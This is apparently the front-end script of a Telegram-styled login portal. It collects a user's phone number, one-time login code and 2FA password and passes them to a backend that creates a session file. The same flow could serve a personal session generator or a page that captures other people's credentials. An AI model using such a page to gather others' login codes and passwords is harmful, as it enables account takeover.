document.addEventListener('DOMContentLoaded', () => {
  // ── Theme Toggle ──────────────────────────────────────────────
  const themeToggle = document.getElementById('theme-toggle');
  const themeIcon   = document.getElementById('theme-icon');
  const htmlEl      = document.documentElement;

  function applyTheme(theme) {
    htmlEl.setAttribute('data-theme', theme);
    themeIcon.textContent = theme === 'dark' ? '🌙' : '☀️';
    localStorage.setItem('portal-theme', theme);
  }

  // Load saved preference (default: dark)
  applyTheme(localStorage.getItem('portal-theme') || 'dark');

  themeToggle.addEventListener('click', () => {
    applyTheme(htmlEl.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
  });
  // ─────────────────────────────────────────────────────────────

  const step1 = document.getElementById('step-1');
  const step2 = document.getElementById('step-2');
  const step3 = document.getElementById('step-3');
  const stepSuccess = document.getElementById('step-success');
  const alertBox = document.getElementById('alert-box');
  const headerSubtitle = document.getElementById('header-subtitle');

  const btnSendCode = document.getElementById('btn-send-code');
  const btnVerifyCode = document.getElementById('btn-verify-code');
  const btnVerify2FA = document.getElementById('btn-verify-2fa');
  const btnBackStep1 = document.getElementById('btn-back-step1');
  const btnReset = document.getElementById('btn-reset');

  // Telegram Style Country Picker Elements
  const countryPicker = document.getElementById('country-picker');
  const countryField = document.getElementById('country-field');
  const countryInput = document.getElementById('country-input');
  const countryDropdownMenu = document.getElementById('country-dropdown-menu');
  const countryList = document.getElementById('country-list');

  // Phone & other form elements (declared here so country picker can access them)
  const inputPhone = document.getElementById('phone');
  const phonePrefix = document.getElementById('phone-prefix'); // persistent code prefix span
  const displayPhoneNum = document.getElementById('display-phone-num');
  const inputCodeHidden = document.getElementById('code');
  const inputPassword = document.getElementById('password');
  const otpBoxes = document.querySelectorAll('.otp-box');
  const resName = document.getElementById('res-name');
  const resUsername = document.getElementById('res-username');
  const resPhone = document.getElementById('res-phone');
  const resFile = document.getElementById('res-file');

  let currentPhone = '';
  let selectedCountry = (typeof ALL_COUNTRIES !== 'undefined' && ALL_COUNTRIES.find(c => c.iso === 'ET')) || { name: "Ethiopia", code: "+251", flag: "🇪🇹", iso: "ET" };
  let highlightedIndex = -1;
  let selectingItem = false; // flag to prevent outside-click from firing during item selection

  function setSelectedCountry(country, updatePhone = true) {
    if (!country) return;
    selectedCountry = country;
    if (countryInput) {
      countryInput.value = country.name;
      countryInput.readOnly = true;
    }
    if (updatePhone) {
      // Update the persistent visible prefix span (white, always visible)
      if (phonePrefix) phonePrefix.textContent = country.code;
      // Only the em-dash format remains as placeholder (no code in placeholder)
      if (inputPhone) {
        inputPhone.placeholder = '——  ———  ———';
        inputPhone.value = '';
      }
    }
  }

  function renderCountryList(filterText = '') {
    if (!countryList || typeof ALL_COUNTRIES === 'undefined') return;
    countryList.innerHTML = '';
    highlightedIndex = -1;

    const query = filterText.trim().toLowerCase().replace(/^\+/, '');

    const filtered = ALL_COUNTRIES.filter(c => {
      if (!query) return true;
      return c.name.toLowerCase().includes(query) ||
             c.code.replace('+', '').includes(query) ||
             c.iso.toLowerCase().includes(query);
    });

    if (filtered.length === 0) {
      countryList.innerHTML = '<div class="no-countries-found">No country found</div>';
      return;
    }

    filtered.forEach((country) => {
      const item = document.createElement('div');
      item.className = `country-item${country.iso === selectedCountry.iso ? ' selected' : ''}`;

      item.innerHTML = `
        <div class="country-item-left">
          <span class="country-item-flag">${country.flag}</span>
          <span class="country-item-name">${country.name}</span>
        </div>
        <span class="country-item-code">${country.code}</span>
      `;

      item.addEventListener('click', (e) => {
        e.stopPropagation();
        selectingItem = true;
        setSelectedCountry(country, true);
        closeCountryDropdown();
        setTimeout(() => { selectingItem = false; }, 0);
      });

      countryList.appendChild(item);
    });
  }

  function openCountryDropdown() {
    if (!countryDropdownMenu) return;
    countryDropdownMenu.classList.remove('hidden');
    countryPicker.classList.add('open');
    if (countryField) countryField.classList.add('focused');
    if (countryInput) {
      countryInput.readOnly = false;
      countryInput.select();
    }
    renderCountryList('');
    setTimeout(() => {
      const sel = countryList && countryList.querySelector('.country-item.selected');
      if (sel) sel.scrollIntoView({ block: 'nearest' });
    }, 50);
  }

  function closeCountryDropdown() {
    if (!countryDropdownMenu) return;
    countryDropdownMenu.classList.add('hidden');
    countryPicker.classList.remove('open');
    if (countryField) countryField.classList.remove('focused');
    if (countryInput) {
      countryInput.value = selectedCountry.name;
      countryInput.readOnly = true;
    }
    highlightedIndex = -1;
  }

  if (countryInput) {
    countryInput.addEventListener('focus', () => {
      openCountryDropdown();
    });

    countryInput.addEventListener('click', (e) => {
      e.stopPropagation();
      if (countryDropdownMenu && countryDropdownMenu.classList.contains('hidden')) {
        openCountryDropdown();
      }
    });

    countryInput.addEventListener('input', (e) => {
      renderCountryList(e.target.value);
    });

    countryInput.addEventListener('keydown', (e) => {
      if (!countryList) return;
      const items = countryList.querySelectorAll('.country-item');
      if (items.length === 0) return;

      if (e.key === 'ArrowDown') {
        e.preventDefault();
        highlightedIndex = (highlightedIndex + 1) % items.length;
        updateHighlight(items);
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        highlightedIndex = (highlightedIndex - 1 + items.length) % items.length;
        updateHighlight(items);
      } else if (e.key === 'Enter') {
        e.preventDefault();
        const target = highlightedIndex >= 0 ? items[highlightedIndex] : items[0];
        if (target) target.click();
      } else if (e.key === 'Escape') {
        closeCountryDropdown();
      }
    });
  }

  // Close dropdown when clicking outside, but not when clicking an item
  document.addEventListener('click', (e) => {
    if (selectingItem) return;
    if (countryPicker && !countryPicker.contains(e.target)) {
      closeCountryDropdown();
    }
  });

  function updateHighlight(items) {
    items.forEach((item, idx) => {
      item.classList.toggle('highlighted', idx === highlightedIndex);
      if (idx === highlightedIndex) item.scrollIntoView({ block: 'nearest' });
    });
  }

  // Sync country picker when user types in the phone field
  if (inputPhone) {
    inputPhone.addEventListener('input', () => {
      const val = inputPhone.value.trim();
      if (!val.startsWith('+') || typeof ALL_COUNTRIES === 'undefined') return;
      let match = null;
      let matchLen = 0;
      for (const country of ALL_COUNTRIES) {
        if (val.startsWith(country.code) && country.code.length > matchLen) {
          match = country;
          matchLen = country.code.length;
        }
      }
      if (match && match.iso !== selectedCountry.iso) {
        setSelectedCountry(match, false);
      }
    });
  }

  // On page load: set default country and inject its code into the phone field
  setSelectedCountry(selectedCountry, true);

  // OTP Box Auto-Focus behavior & Auto-Submit
  let isSubmittingOtp = false;
  const otpVerifyingStatus = document.getElementById('otp-verifying-status');

  otpBoxes.forEach((box, idx) => {
    box.addEventListener('input', (e) => {
      const val = e.target.value;
      if (val && idx < otpBoxes.length - 1) {
        otpBoxes[idx + 1].focus();
      }
      checkAndAutoSubmitOtp();
    });

    box.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        otpBoxes[idx - 1].focus();
      }
    });

    box.addEventListener('paste', (e) => {
      e.preventDefault();
      const pasteData = (e.clipboardData || window.clipboardData).getData('text').trim();
      if (pasteData.length === 5 && /^\d+$/.test(pasteData)) {
        pasteData.split('').forEach((char, i) => {
          if (otpBoxes[i]) otpBoxes[i].value = char;
        });
        otpBoxes[4].focus();
        checkAndAutoSubmitOtp();
      }
    });
  });

  function combineOtpCode() {
    let code = '';
    otpBoxes.forEach(b => code += b.value);
    inputCodeHidden.value = code;
    return code;
  }

  async function parseJsonSafely(res) {
    const text = await res.text();
    try {
      return JSON.parse(text);
    } catch (e) {
      return { detail: text || `Server Error (${res.status})` };
    }
  }

  function checkAndAutoSubmitOtp() {
    const code = combineOtpCode();
    if (code.length === 5 && !isSubmittingOtp) {
      autoSubmitOtp(code);
    }
  }

  async function autoSubmitOtp(code) {
    if (isSubmittingOtp) return;
    isSubmittingOtp = true;
    hideAlert();

    // Disable inputs & show loading status
    otpBoxes.forEach(b => b.disabled = true);
    if (otpVerifyingStatus) otpVerifyingStatus.classList.remove('hidden');

    try {
      const res = await fetch('/api/verify-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: currentPhone, code })
      });
      const data = await parseJsonSafely(res);

      if (!res.ok) {
        throw new Error(data.detail || 'Code verification failed.');
      }

      if (data.requires_2fa) {
        showStep(step3, 'Please enter your 2-Step Verification password.');
      } else if (data.success) {
        if (resName) resName.textContent = data.user.name;
        if (resUsername) resUsername.textContent = data.user.username;
        if (resPhone) resPhone.textContent = data.user.phone;
        if (resFile) resFile.textContent = data.session_file;
        showStep(stepSuccess);
      }

    } catch (err) {
      showAlert(err.message);
      // Re-enable OTP boxes on error so user can fix input
      otpBoxes.forEach(b => b.disabled = false);
      otpBoxes[4].focus();
    } finally {
      isSubmittingOtp = false;
      if (otpVerifyingStatus) otpVerifyingStatus.classList.add('hidden');
    }
  }

  const btnEditPhone = document.getElementById('btn-edit-phone');

  function showAlert(msg, isError = true) {
    alertBox.textContent = msg;
    alertBox.className = `alert ${isError ? 'alert-error' : 'alert-success'}`;
  }

  function hideAlert() {
    alertBox.className = 'alert hidden';
  }

  function showStep(stepElement, subtitleText) {
    hideAlert();
    if (subtitleText) headerSubtitle.textContent = subtitleText;
    [step1, step2, step3, stepSuccess].forEach(el => el.classList.add('hidden'));
    stepElement.classList.remove('hidden');

    const authHeader = document.querySelector('.auth-header');
    if (stepElement === step2 || stepElement === step3 || stepElement === stepSuccess) {
      if (authHeader) authHeader.classList.add('hidden');
    } else {
      if (authHeader) authHeader.classList.remove('hidden');
    }

    if (stepElement === step3 && inputPassword) {
      setTimeout(() => inputPassword.focus(), 50);
    }
  }

  // Password Eye Toggle & Forgot Password
  const btnTogglePassword = document.getElementById('btn-toggle-password');
  const eyeIcon = document.getElementById('eye-icon');
  const linkForgotPassword = document.getElementById('link-forgot-password');

  if (btnTogglePassword && inputPassword) {
    btnTogglePassword.addEventListener('click', () => {
      const isPassword = inputPassword.type === 'password';
      inputPassword.type = isPassword ? 'text' : 'password';
      if (eyeIcon) {
        eyeIcon.innerHTML = isPassword ? '🙈' : '👁️';
      }
    });
  }

  if (linkForgotPassword) {
    linkForgotPassword.addEventListener('click', (e) => {
      e.preventDefault();
      showAlert('If you forgot your 2FA password, you can reset or recover it in your Telegram mobile or desktop app.', false);
    });
  }

  if (inputPassword) {
    inputPassword.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        if (btnVerify2FA) btnVerify2FA.click();
      }
    });
  }

  // Step 1: Send Code
  if (btnSendCode) {
    btnSendCode.addEventListener('click', async () => {
      const localVal = inputPhone.value.trim();
      if (!localVal) return showAlert('Please enter your phone number.');

      const phone = localVal.startsWith('+') ? localVal : `${selectedCountry.code}${localVal}`;

      btnSendCode.disabled = true;
      btnSendCode.textContent = 'CONNECTING...';
      hideAlert();

      try {
        const res = await fetch('/api/send-code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone })
        });
        const data = await parseJsonSafely(res);

        if (!res.ok) {
          throw new Error(data.detail || 'Failed to send verification code.');
        }

        currentPhone = phone;

        if (data.already_authorized) {
          if (resName) resName.textContent = data.user.name;
          if (resUsername) resUsername.textContent = data.user.username;
          if (resPhone) resPhone.textContent = data.user.phone;
          if (resFile) resFile.textContent = data.session_file;
          showStep(stepSuccess);
        } else {
          displayPhoneNum.textContent = phone;
          showStep(step2, 'We have sent you a message with the verification code.');
          otpBoxes[0].focus();
        }

      } catch (err) {
        showAlert(err.message);
      } finally {
        btnSendCode.disabled = false;
        btnSendCode.textContent = 'NEXT';
      }
    });
  }

  // Step 3: Verify 2FA
  if (btnVerify2FA) {
    btnVerify2FA.addEventListener('click', async () => {
      const password = inputPassword.value.trim();
      if (!password) return showAlert('Please enter your password.');

      btnVerify2FA.disabled = true;
      btnVerify2FA.textContent = 'NEXT...';
      hideAlert();

      try {
        const res = await fetch('/api/verify-2fa', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ phone: currentPhone, password })
        });
        const data = await parseJsonSafely(res);

        if (!res.ok) {
          throw new Error(data.detail || '2FA verification failed.');
        }

        if (data.success) {
          if (resName) resName.textContent = data.user.name;
          if (resUsername) resUsername.textContent = data.user.username;
          if (resPhone) resPhone.textContent = data.user.phone;
          if (resFile) resFile.textContent = data.session_file;
          showStep(stepSuccess);
        }

      } catch (err) {
        showAlert(err.message);
      } finally {
        btnVerify2FA.disabled = false;
        btnVerify2FA.textContent = 'NEXT';
      }
    });
  }

  // Navigation Handlers
  if (btnEditPhone) {
    btnEditPhone.addEventListener('click', () => {
      showStep(step1, 'Confirm your country code and enter your phone number to authorize a new session.');
    });
  }

  if (btnBackStep1) {
    btnBackStep1.addEventListener('click', () => {
      showStep(step1, 'Confirm your country code and enter your phone number to authorize a new session.');
    });
  }

  if (btnReset) {
    btnReset.addEventListener('click', () => {
      otpBoxes.forEach(b => b.value = '');
      inputCodeHidden.value = '';
      inputPassword.value = '';
      showStep(step1, 'Confirm your country code and enter your phone number to authorize a new session.');
    });
  }
});
